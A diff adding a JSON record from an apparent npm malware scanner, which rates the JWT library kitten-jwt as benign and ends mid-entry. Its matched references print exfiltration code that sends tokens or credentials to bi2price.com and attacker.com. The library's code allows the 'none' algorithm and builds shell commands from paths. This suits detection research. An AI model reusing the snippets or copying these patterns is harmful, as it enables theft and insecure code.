@@ -1,0 +1,470 @@
+{
+  "package_name": "kitten-jwt",
+  "package_version": "3.2.0",
+  "label": "benign",
+  "detection_time": "2026-05-26T19:02:39.657721",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/kitten-jwt/3.2.0/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/kitten-jwt/3.2.0/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "const path   = require('path');\nconst exec   = require('child_process').exec;\nconst jwa    = require('jwa');\nconst cache  = require('kitten-cache');\n\nconst DEFAULT_ALGORITHM_BITS = '512';\nconst DEFAULT_ALGORITHM_NAME = 'ES' + DEFAULT_ALGORITHM_BITS;\nconst DEFAULT_ALGORITHM_SIGN = 'secp521r1'; // 'prime256v1';\nconst ALLOWED_ALGORITHMS     = ['HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512', 'PS256', 'PS384', 'PS512', 'ES256', 'ES384', 'ES512', 'none'];\n\nconst TOKEN_COOKIE_REGEXP = /access_token\\s*=([^;]+?)(?:;|$)/;\n\nconst params = {\n  clientCacheSize                        : 255,\n  clientRenewTokenBeforeExp              : 60 * 20 * 1000,\n  clientTokenExpiration                  : 60 * 60 * 12,\n  serverCacheSize                        : 255,\n  serverGetPublicKeyErrorCacheExpiration : 120 * 1000\n};\n\nlet clientCache = new cache({size : params.clientCacheSize});\nlet serverCache = new cache({size : params.serverCacheSize});\n\nfunction set (options) {\n  for (const _attr in options) {\n    if (params[_attr] !== undefined) {\n      params[_attr] = options[_attr];\n    }\n  }\n  if (options.clientCacheSize || options.serverCacheSize) {\n    clientCache = new cache({size : params.clientCacheSize});\n    serverCache = new cache({size : params.serverCacheSize});\n  }\n}\n\nfunction base64urlDecode (str) {\n  const _str = str.replace(/-/g, '+').replace(/_/g, '/');\n  return Buffer\n    .from(_str, 'base64')\n    .toString('utf8');\n}\n\nfunction base64urlEncode (str) {\n  return Buffer\n    .from(str, 'utf8')\n    .toString('base64')\n    .replace(/=/g, '')\n    .replace(/\\+/g, '-')\n    .replace(/\\//g, '_');\n}\n\nfunction generateECDHKeys (outputDir, outputKeyName, callback) {\n  const _filepath = path.join(outputDir, outputKeyName);\n  const _cmdline  = `openssl ecparam -name ${DEFAULT_ALGORITHM_SIGN} -out ${_filepath}-temp.pem && openssl ecparam -in ${_filepath}-temp.pem -genkey -noout -out ${_filepath}.pem && openssl ec -in ${_filepath}.pem -pubout -out ${_filepath}.pub && rm ${_filepath}-temp.pem`;\n  exec(_cmdline, function (err, stdout, stderr) {\n    if (err) {\n      console.log('WARNING: cannot generate ECDH keys:' + err);\n    }\n    callback(err, stderr, stdout);\n  });\n}\n\nfunction generate (options, data) {\n  const _now = Math.floor(Date.now() / 1000);\n  const _header = {\n    alg : options?.header?.alg || DEFAULT_ALGORITHM_NAME,\n    typ : options?.header?.typ || 'JWT',\n    ...(options?.header?.kid) && { kid : options.header.kid },\n  };\n\n  const _payloadObject = Object.assign({\n    iss : options.payload.clientId,\n    aud : options.payload.serverId,\n    exp : (_now + options.payload.expiresIn)\n  }, options.payload);\n  \n  const {\n    clientId,\n    serverId,\n    expiresIn, \n    ... _payload \n  } = _payloadObject;\n\n  if (data) {\n    _payload.data = data;\n  }\n  \n  const _tokenString = base64urlEncode(JSON.stringify(_header))+'.'+base64urlEncode(JSON.stringify(_payload));\n  const _signature   = jwa(options?.header?.alg || DEFAULT_ALGORITHM_NAME).sign(_tokenString, options.privKey);\n  const _tokenBase64WithSignature = _tokenString + '.' + _signature;\n\n  return _tokenBase64WithSignature;\n}\n\nfunction parseToken (jwt, callback, now = Date.now()) {\n  const _segments = jwt.split('.');\n  if (_segments.length !== 3) {\n    return callback(new Error('Invalid JSON Web Token: Not enough or too many segments'));\n  }\n  const _headerBase64  = _segments[0];\n  const _payloadBase64 = _segments[1];\n  const _signature     = _segments[2];\n  const _tokenString   = _headerBase64 + '.' + _payloadBase64;\n  let _header          = null;\n  let _payload         = null;\n\n  try {\n    const _headerString  = base64urlDecode(_headerBase64);\n    const _payloadString = base64urlDecode(_payloadBase64);\n    _header              = JSON.parse(_headerString);\n    _payload             = JSON.parse(_payloadString);\n  }\n  catch (e) {\n    return callback(new Error('Invalid JSON Web Token: ' + e.message));\n  }\n\n  if (!(_payload instanceof Object)) {\n    return callback(new Error('Invalid Payload JSON Web token. It is not an object'));\n  }\n\n  if (!(_header instanceof Object)) {\n    return callback(new Error('Invalid Header JSON Web Token. It is not an object'));\n  }\n\n  if (!ALLOWED_ALGORITHMS.includes(_header.alg)) {\n    return callback(new Error(`Algorithm not accepted for JSON Web Token. Only ${ALLOWED_ALGORITHMS.join(', ')} are accepted`));\n  }\n\n  if (_payload.exp && now > parseInt(_payload.exp, 10) * 1000) {\n    return callback(new Error('JSON Web Token expired'), _header, _payload);\n  }\n\n  if (_payload.iss === '' || _payload.iss === undefined || _payload.iss === null) {\n    return callback(new Error('JSON Web Token without issuer'));\n  }\n\n  return callback(null, _header, _payload, _tokenString, _signature);\n}\n\nfunction verifyToken (header, payload, tokenString, signature, publicKey, callback) {\n  try {\n    const _isValidSignature = jwa(header?.alg || DEFAULT_ALGORITHM_NAME).verify(tokenString, signature, publicKey);\n\n    if (_isValidSignature === false) {\n      return callback(new Error('Invalid JSON Web Token signature'));\n    }\n  } catch (e) {\n    return callback(new Error('Invalid JSON Web Token: ' + e.message));\n  }\n\n  return callback(null, payload);\n}\n\nfunction verify (jwt, publicKey, callback, now = Date.now()) {\n  parseToken(jwt, (err, header, payload, tokenString, signature) => {\n    if (err) {\n      return callback(err, payload);\n    }\n\n    return verifyToken(header, payload, tokenString, signature, publicKey, callback);\n  }, now);\n}\n\nfunction getToken (options, data) {\n  const _cacheKey    = options.payload.clientId + '_' + options.payload.serverId;\n  const _cachedToken = clientCache.get(_cacheKey);\n  const _now         = Date.now();\n  if ( \n    _cachedToken !== undefined \n      && _now < (_cachedToken.expireAt - params.clientRenewTokenBeforeExp) \n        && _cachedToken.privKey === options.privKey \n  ) {\n    return _cachedToken.token;\n  }\n\n  const optionForTokenGeneration = {\n    ... options,\n    payload : {\n      ... options.payload,\n      expiresIn : params.clientTokenExpiration\n    }\n  };\n  const _newToken = generate(optionForTokenGeneration, data);\n\n  clientCache.set(_cacheKey, {\n    token    : _newToken,\n    privKey  : options.privKey,\n    expireAt : _now + (params.clientTokenExpiration * 1000)\n  });\n\n  return _newToken;\n}\n\nfunction verifyTokenForEachPublicKey (publicKeys, header, payload, tokenString, signature, callback, i = 0) {\n  verifyToken(header, payload, tokenString, signature, publicKeys[i], (err) => {\n    i++;\n    if (!err || i >= publicKeys.length) {\n      return callback(err);\n    }\n    process.nextTick(() => {\n      verifyTokenForEachPublicKey(publicKeys, header, payload, tokenString, signature, callback, i);\n    });\n  });\n}\n\nfunction findToken (req, callback) {\n  if (!req.headers) {\n    return callback(new Error('JSON Web Token - No HTTP header detected'));\n  }\n  const _token = req.headers.authorization || req.headers.Authorization || parseCookie(req.headers.cookie);\n\n  if (typeof _token !== 'string' || _token.length === 0) {\n    return callback(new Error('No JSON Web Token detected in Authorization header or Cookie. Format is \"Authorization: jwt\" or \"Cookie: access_token=jwt\"'));\n  }\n  if (/^Bearer /i.test(_token) === true) {\n    return callback(null, _token.slice(7));\n  }\n\n  return callback(null, _token);\n}\n\nfunction parseCookie (cookie) {\n  const _token = TOKEN_COOKIE_REGEXP.exec(cookie);\n  if (_token instanceof Array && _token.length > 1) {\n    return _token[1].trim();\n  }\n  return null;\n}\n\nfunction verifyHTTPHeaderFn (serverId, getPublicKeyFn) {\n  return function (req, res, next) {\n    findToken(req, (err, _token) => {\n      if (err) {\n        return next(err);\n      }\n      const _now = Date.now();\n\n      const _cachedToken = serverCache.get(_token);\n      if (_cachedToken && (_cachedToken.expireAt === 0 || _cachedToken.expireAt > _now)) {\n        if (_cachedToken.payload !== undefined && _cachedToken.payload.exp !== undefined && _now > parseInt(_cachedToken.payload.exp, 10) * 1000) {\n          _cachedToken.err = new Error('JSON Web Token expired');\n        }\n        if (_cachedToken.err) {\n          return next(_cachedToken.err);\n        }\n        req.jwtPayload = _cachedToken.payload;\n        return next();\n      }\n\n      parseToken(_token, (err, header, payload, tokenString, signature) => {\n        if (err) {\n          serverCache.set(_token, { payload : payload, err : err, expireAt : 0 });\n          return next(err);\n        }\n        if (payload && payload.aud !== serverId) {\n          const _err = new Error('Invalid JSON Web Token audience');\n          serverCache.set(_token, { payload : payload, err : _err, expireAt : 0 });\n          return next(_err);\n        }\n        getPublicKeyFn(req, res, payload, function (errPublicKey, publicKey) {\n          const _publicKeys = (publicKey instanceof Array) ? publicKey : [publicKey];\n          if (errPublicKey || !publicKey || _publicKeys.length === 0) {\n            const _err = new Error('Empty public key or no public key available');\n            serverCache.set(_token, { payload : payload, err : _err, expireAt : (_now + params.serverGetPublicKeyErrorCacheExpiration) });\n            return next(_err);\n          }\n          verifyTokenForEachPublicKey(_publicKeys, header, payload, tokenString, signature, (err) => {\n            serverCache.set(_token, { payload : payload, err : err, expireAt : 0 });\n            if (err) {\n              return next(err);\n            }\n            req.jwtPayload = payload;\n            next();\n          });\n        });\n      });\n    });\n  };\n}\n\nfunction resetCache () {\n  clientCache.clear();\n  serverCache.clear();\n}\n\nmodule.exports = {\n  generate,\n  generateECDHKeys,\n  getToken,\n  parseCookie,\n  parseToken,\n  resetCache,\n  set,\n  verify,\n  verifyHTTPHeaderFn,\n  generateAuto : getToken\n};",
+          "is_malicious": false,
+          "malice_score": 0.49623743891716005,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code generates, signs, parses, verifies, caches, and renews JSON Web Tokens (JWTs) using cryptographic operations via jwa and base64url encoding/decoding. It accesses and modifies in-memory caches for tokens, uses child_process.exec to execute OpenSSL commands for ECDH key generation, and processes HTTP request headers and cookies to extract tokens. This enables secure token-based authentication and authorization, facilitating cryptographic key management and JWT lifecycle handling without network or file exfiltration.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code implements JWT generation, signing, parsing, verification, and caching using standard cryptographic libraries and base64url encoding. It uses child_process.exec only to run OpenSSL commands for ECDH key generation, which is a legitimate cryptographic operation. The code carefully validates JWT structure, algorithms, expiration, and issuer fields. It does not accept unvalidated user-supplied objects as cryptographic keys; the public keys used in verification are expected to be provided by a trusted getPublicKeyFn callback. There is no evidence of disabling security features, file system or network exfiltration, or arbitrary code execution. While the code shares some superficial similarity with known malicious JWT verification patterns (e.g., use of JWT verification APIs), it does not exhibit the critical unsafe behaviors such as accepting attacker-controlled objects as keys or performing unsafe operations during verification. Therefore, it is best classified as benign with very low confidence of maliciousness.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240708_171645_588844_snippet_1",
+              "source_package": "jsonwebtoken (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171645_588844/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5205042362213135,
+              "code_similarity": 0.4974778890609741,
+              "behavior_similarity": 0.5435305237770081,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "jwt.verify(token, secretOrPublicKey, options, callback)",
+                "code_behavior": "At runtime, when a JWT verification request is processed, the code invokes jsonwebtoken.verify() with a user-supplied secretOrPublicKey parameter, which is not type-checked. This allows a maliciously crafted object to be passed, leading to arbitrary file writes or remote code execution during the verification process.",
+                "malice_analysis": {
+                  "why_suspicious": "Accepting user-controlled objects as cryptographic keys without type validation is highly dangerous. Attackers can supply objects with custom properties or methods that are executed during JWT verification, enabling exploitation such as arbitrary file writes or code execution.",
+                  "violated_expectations": "The secretOrPublicKey parameter is expected to be a string or buffer representing a cryptographic key. Allowing objects with executable properties violates secure coding practices and the principle of least privilege.",
+                  "similar_legitimate_use": "Some advanced cryptographic libraries may accept key objects for extensibility, but these should be strictly validated and never directly user-controlled. In legitimate use, such objects are typically constructed internally and not exposed to untrusted input.",
+                  "key_indicators": [
+                    "No type enforcement on secretOrPublicKey parameter in jsonwebtoken.verify()",
+                    "User-supplied object accepted as cryptographic key",
+                    "Presence of custom properties or methods on secretOrPublicKey object",
+                    "File system modifications or process execution during JWT verification"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (JWT verification request handling)",
+                  "file_location": "application code where jsonwebtoken.verify() is invoked (e.g., authentication middleware or route handler)",
+                  "required_permissions": [
+                    "filesystem write access",
+                    "ability to deserialize arbitrary objects"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "jsonwebtoken",
+                  "package_manager": "npm",
+                  "package_versions": "<=8.5.1",
+                  "why_malicious": "The package contains a critical vulnerability (CVE-2022-23529) in its verify() method, which allows attackers to supply a maliciously crafted object as the secretOrPublicKey parameter. This can result in arbitrary file writes and, under certain conditions, remote code execution (RCE) on the server verifying JWTs. The flaw is present in all versions up to and including 8.5.1, making the entire package version range susceptible to exploitation. The vulnerability arises from a lack of type checking on the secretOrPublicKey parameter, enabling attackers to abuse the verification process."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker crafts a malicious JWT and a specially crafted object as the secretOrPublicKey parameter.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious object is passed to the server's JWT verification logic."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Server invokes jsonwebtoken.verify() with the attacker-controlled object as secretOrPublicKey.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious object triggers arbitrary file write or code execution during verification."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker achieves remote code execution or arbitrary file write on the server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Full compromise of the server or application."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "jsonwebtoken.verify() invoked with a secretOrPublicKey parameter that is not a string or buffer",
+                    "Unexpected object types or objects with custom methods passed as cryptographic keys",
+                    "File system modifications or process launches occurring during JWT verification"
+                  ],
+                  "file_indicators": [
+                    "Unexpected file writes or modifications in application directories during authentication requests",
+                    "Presence of new or modified files in locations not typically written to during normal JWT verification"
+                  ],
+                  "network_indicators": [
+                    "Unusual JWT verification requests where the secretOrPublicKey parameter is an object instead of a string or buffer",
+                    "Outbound network connections initiated during or immediately after JWT verification (if RCE is achieved)"
+                  ],
+                  "how_to_detect": "Monitor application code and runtime logs for instances where jsonwebtoken.verify() is called with a secretOrPublicKey parameter that is not a string or buffer. Implement runtime type checks and alert on any object or function types passed as keys. Correlate authentication requests with unexpected file system activity or process launches. Upgrade to jsonwebtoken version 9.0.0 or later to ensure the vulnerability is patched and enforce strict type validation on cryptographic key parameters."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133836_800754_snippet_1",
+              "source_package": "jsonwebtoken (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133836_800754/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5011006593704224,
+              "code_similarity": 0.4974778890609741,
+              "behavior_similarity": 0.5047233700752258,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "jwt.verify(token, secretOrPublicKey, options, callback)",
+                "code_behavior": "At runtime, when the application calls verify() with a user-supplied JWT and a maliciously crafted secretOrPublicKey object, the function processes the object without strict type validation, allowing attacker-controlled object properties or methods to be accessed or invoked, which can result in arbitrary file writes or remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "The verify() method accepts the secretOrPublicKey parameter without enforcing that it is a string or buffer, allowing attackers to pass objects with malicious properties or methods. This lack of type enforcement enables exploitation through crafted objects that can trigger file operations or code execution when their properties are accessed within the verification process.",
+                  "violated_expectations": "In secure cryptographic operations, secretOrPublicKey should be strictly a string or buffer representing a cryptographic key. Accepting arbitrary objects violates the expectation of strict type safety and opens the door to property access or method invocation attacks within sensitive code paths.",
+                  "similar_legitimate_use": "Some advanced cryptographic libraries may accept key objects for extensibility, but such usage is rare and should always include rigorous type and property validation to prevent abuse. In this case, the lack of validation is the core issue.",
+                  "key_indicators": [
+                    "Absence of type checking on secretOrPublicKey parameter in verify()",
+                    "Ability to pass arbitrary objects to a cryptographic API",
+                    "Access or invocation of attacker-controlled object properties or methods during JWT verification",
+                    "Unexpected file write or code execution originating from JWT verification routines"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (JWT verification)",
+                  "file_location": "application code calling jsonwebtoken.verify()",
+                  "required_permissions": [
+                    "filesystem access",
+                    "ability to deserialize arbitrary objects"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "jsonwebtoken",
+                  "package_manager": "npm",
+                  "package_versions": "8.5.1 and earlier",
+                  "why_malicious": "The package contains a critical vulnerability (CVE-2022-23529) in its verify() method, which allows attackers to supply a maliciously crafted object as the secretOrPublicKey parameter. This can result in arbitrary file writes and potentially remote code execution (RCE) on servers that use the library for JWT verification, due to improper type validation and unsafe handling of object properties within cryptographic routines."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker crafts a malicious JWT and a specially constructed secretOrPublicKey object with properties or methods designed to trigger file writes or code execution when accessed.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "The malicious object is passed to the server's JWT verification logic."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Server application calls jsonwebtoken.verify() with attacker-controlled parameters, including the crafted object as secretOrPublicKey.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "The verify() method processes the malicious object, accessing or invoking its properties or methods, which leads to arbitrary file write or remote code execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code or file operation is executed on the server as a result of the crafted object's properties or methods being triggered within the verification process.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker gains code execution or writes files on the target server, achieving full compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Passing non-string, non-buffer objects as secretOrPublicKey to JWT verification functions",
+                    "Access or invocation of object properties or methods within cryptographic routines during JWT verification",
+                    "Unexpected file write or process execution operations triggered during JWT verification"
+                  ],
+                  "file_indicators": [
+                    "Creation or modification of files in application-accessible directories (e.g., /tmp, /var/tmp, or application-specific data folders) during JWT processing"
+                  ],
+                  "network_indicators": [
+                    "Inbound JWT verification requests containing non-standard or object-encoded secretOrPublicKey parameters",
+                    "Unusual patterns in JWT payloads or headers that suggest exploitation attempts"
+                  ],
+                  "how_to_detect": "Instrument application code to log and alert when the secretOrPublicKey parameter in jsonwebtoken.verify() is not a string or buffer. Implement runtime type checks and block or alert on attempts to pass objects. Monitor for unexpected file writes or process execution events during JWT verification. Review incoming JWT requests for abnormal payloads or parameters that deviate from expected formats, and audit application logs for evidence of exploitation attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_781157_snippet_1",
+              "source_package": "Unknown (malicious NPM package used in Lazarus campaign) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_781157/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4734443724155426,
+              "code_similarity": 0.42678695917129517,
+              "behavior_similarity": 0.52010178565979,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;\n\nvar dir = os.homedir() + \"/.cprice\";\nif (fs.existsSync(dir)){\n    const token = fs.readFileSync(dir + '/pricetoken', {encoding:'utf8', flag:'r'});\n    getpricediff('bi2price.com', '/getfullhistory.php', token, path.join(dir, 'price.dat'));\n}",
+                "code_behavior": "At import-time or runtime, the code disables TLS certificate validation by setting NODE_TLS_REJECT_UNAUTHORIZED to 0, checks for the existence of a hidden directory in the user's home folder, reads a token from a hidden file, and sends the token to a remote attacker-controlled domain via a network request, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code disables TLS security checks, accesses hidden files in the user's home directory, and exfiltrates sensitive data to an external, attacker-controlled domain. Disabling TLS validation exposes the user to man-in-the-middle attacks, and the exfiltration of tokens is a clear sign of credential theft.",
+                  "violated_expectations": "Legitimate npm packages should not disable TLS certificate validation, should not access or read hidden directories and files in the user's home directory without explicit user consent, and should never exfiltrate sensitive tokens to untrusted third-party domains. Secure packages use proper network security practices and handle sensitive data responsibly.",
+                  "similar_legitimate_use": "A legitimate application might read configuration files or tokens for user authentication, but would not disable TLS validation or transmit sensitive tokens to untrusted or unknown domains. Secure applications would use environment variables and network requests in a transparent and secure manner.",
+                  "key_indicators": [
+                    "Disabling TLS certificate validation by setting NODE_TLS_REJECT_UNAUTHORIZED=0",
+                    "Accessing hidden directory and files in user's home directory (e.g., ~/.cprice/pricetoken)",
+                    "Reading sensitive tokens from hidden files",
+                    "Outbound network request to suspicious domain (bi2price.com) with sensitive data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At import-time or runtime, depending on how the package is used",
+                  "file_location": "Main JavaScript file of the malicious npm package",
+                  "required_permissions": [
+                    "filesystem (read access to user home directory and hidden files)",
+                    "network (outbound HTTP/HTTPS requests)",
+                    "environment_vars (modification of process environment variables)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (malicious NPM package used in Lazarus campaign)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (all versions associated with the campaign)",
+                  "why_malicious": "The package functions as a first-stage malware downloader, exfiltrating sensitive data and retrieving additional payloads from attacker-controlled infrastructure. It is distributed via targeted social engineering against developers in high-value sectors, forming part of a sophisticated supply-chain attack. The package disables security controls, accesses hidden files, and communicates with known malicious domains."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Target is socially engineered to install or collaborate on a project containing the malicious npm package.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of the malicious npm package on the developer's machine."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious npm package executes, disables TLS validation, and attempts to read sensitive tokens from a hidden directory.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exfiltration of sensitive data to attacker-controlled infrastructure."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious package contacts remote server to download and execute additional payloads (second-stage malware).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of further malware, full compromise of the developer's environment."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Disabling TLS certificate validation in Node.js processes by setting NODE_TLS_REJECT_UNAUTHORIZED=0",
+                    "Access to hidden directories and files in user home directories (e.g., ~/.cprice/pricetoken)",
+                    "Outbound network requests to suspicious or attacker-controlled domains (e.g., bi2price.com) during package installation or import",
+                    "Fetching and executing remote payloads as part of package initialization"
+                  ],
+                  "file_indicators": [
+                    ".cprice/pricetoken",
+                    ".cprice/price.dat"
+                  ],
+                  "network_indicators": [
+                    "bi2price.com",
+                    "Outbound requests to /getfullhistory.php endpoint"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that disable TLS certificate validation by setting NODE_TLS_REJECT_UNAUTHORIZED=0, access hidden files in user directories (such as ~/.cprice/pricetoken), or make outbound network requests to untrusted domains like bi2price.com. Flag packages that read files like ~/.cprice/pricetoken and immediately send their contents externally. Use network monitoring to detect connections to known malicious domains and suspicious endpoints, especially during npm install or package import events."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456530_snippet_2",
+              "source_package": "Multiple dependency confusion copycat packages (npm) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20250105_195714_456530/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47343748807907104,
+              "code_similarity": 0.46054452657699585,
+              "behavior_similarity": 0.48633044958114624,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const https = require('https');\nhttps.request({hostname: 'attacker.com', method: 'POST', path: '/token', headers: {'Content-Type': 'application/json'}}, req => {}).end(JSON.stringify({token: process.env.NPM_TOKEN}));",
+                "code_behavior": "At import-time, the code accesses the NPM_TOKEN environment variable and sends its value to a hardcoded external domain via HTTPS POST, enabling credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code immediately accesses environment variables containing credentials and exfiltrates them to an attacker-controlled server, which is a hallmark of credential theft.",
+                  "violated_expectations": "Legitimate packages do not access or transmit environment variables containing sensitive credentials at import-time.",
+                  "similar_legitimate_use": "Some telemetry or error reporting may send non-sensitive data, but never credentials or tokens.",
+                  "key_indicators": [
+                    "Access to environment variables at import-time",
+                    "Immediate network exfiltration of sensitive data",
+                    "Hardcoded attacker-controlled domains in code",
+                    "Top-level code in entrypoint files making outbound requests"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (top-level code)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Multiple dependency confusion copycat packages (npm)",
+                  "package_manager": "npm",
+                  "package_versions": "Various (spikes in March 2021, 10,000+ packages)",
+                  "why_malicious": "These packages are intentionally crafted to exploit dependency confusion vulnerabilities by mimicking internal or private package names. Their goal is to deceive build systems into installing malicious code from public repositories, thereby infiltrating software supply chains to exfiltrate sensitive data or execute unauthorized actions during installation or import."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is published to npm with a name matching an internal or private dependency, targeting organizations using private registries.",
+                    "implemented_by": [],
+                    "leads_to": "Build systems resolve and install the public malicious package instead of the intended private one."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes during installation (postinstall) or import (top-level code), harvesting sensitive files or environment variables.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data such as system files or credentials is exfiltrated to attacker-controlled infrastructure."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Exfiltrated data is received by the attacker, enabling further compromise such as credential abuse or lateral movement within the target organization.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains access to credentials, tokens, or internal information, potentially leading to broader compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "postinstall scripts in package.json that initiate network requests",
+                    "import-time code in entrypoint files accessing and exfiltrating environment variables",
+                    "package names in public registries matching known internal or private dependencies"
+                  ],
+                  "file_indicators": [
+                    "package.json containing postinstall scripts with network or file access commands",
+                    "index.js or main entrypoint files with top-level code making outbound network requests"
+                  ],
+                  "network_indicators": [
+                    "HTTP/HTTPS POST requests to hardcoded or untrusted external domains during installation or import",
+                    "Outbound requests containing sensitive file contents (e.g., /etc/passwd) or environment variables (e.g., NPM_TOKEN)"
+                  ],
+                  "how_to_detect": "Monitor for packages with postinstall scripts that perform network requests or access sensitive files. Flag packages whose names match known internal dependencies. Analyze entrypoint files for code that accesses environment variables and sends data to external domains. Use network monitoring to detect suspicious outbound connections, especially POST requests containing sensitive data, during package installation or import."
+                }
+              }
+            },
+            {
+              "match_id": "20240708_171640_058672_snippet_4",
+              "source_package": "Greatness (N/A (Phishing-as-a-Service toolkit, not a traditional package manager))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171640_058672/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4694296717643738,
+              "code_similarity": 0.42766666412353516,
+              "behavior_similarity": 0.5111926794052124,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "const encrypted = AES.encrypt(JSON.stringify({username, password}), key);\nconst jwt = btoa(Date.now().toString());\nfetch('https://attacker.com/submit', { headers: { 'Authorization': `Bearer ${jwt}` }, body: encrypted })",
+                "code_behavior": "After credentials are captured, the script encrypts the data using AES with a PBKDF2-derived key, generates a JWT containing a Base64-encoded timestamp, and sends the encrypted payload via AJAX POST to the attacker's server, facilitating stealthy exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The use of client-side encryption and JWTs for exfiltration is intended to evade detection by security tools and hinder forensic analysis, as the payload is not easily readable in transit.",
+                  "violated_expectations": "Legitimate sites do not encrypt and exfiltrate user credentials to unknown or untrusted endpoints, nor do they use JWTs in this context.",
+                  "similar_legitimate_use": "Encryption is used for secure communication with trusted services, not for hiding stolen data sent to attacker infrastructure.",
+                  "key_indicators": [
+                    "AES encryption of credential payloads in client-side JavaScript",
+                    "JWTs with Base64-encoded timestamps used as authorization headers",
+                    "AJAX POST requests to non-Microsoft, attacker-controlled domains"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "data exfiltration (after credential capture)",
+                  "file_location": "JavaScript in phishing page",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Greatness",
+                  "package_manager": "N/A (Phishing-as-a-Service toolkit, not a traditional package manager)",
+                  "package_versions": "All versions since 2022 (continuously updated)",
